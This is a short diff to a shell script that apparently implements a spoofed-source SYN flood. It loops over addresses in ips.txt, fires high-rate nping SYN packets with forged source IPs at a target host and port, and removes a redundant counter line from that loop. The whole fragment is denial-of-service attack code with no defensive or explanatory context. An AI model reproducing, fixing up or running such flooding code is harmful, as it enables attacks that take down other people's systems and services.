@@ -35,7 +35,6 @@ else
   else
     for i in $(tr '\n' ' '<ips.txt); do
       nping -c 1 --rate 90000 --tcp --flags SYN -S $i -g $2 $1 &
-      i=$[$i+1]
     done
   fi
 fi
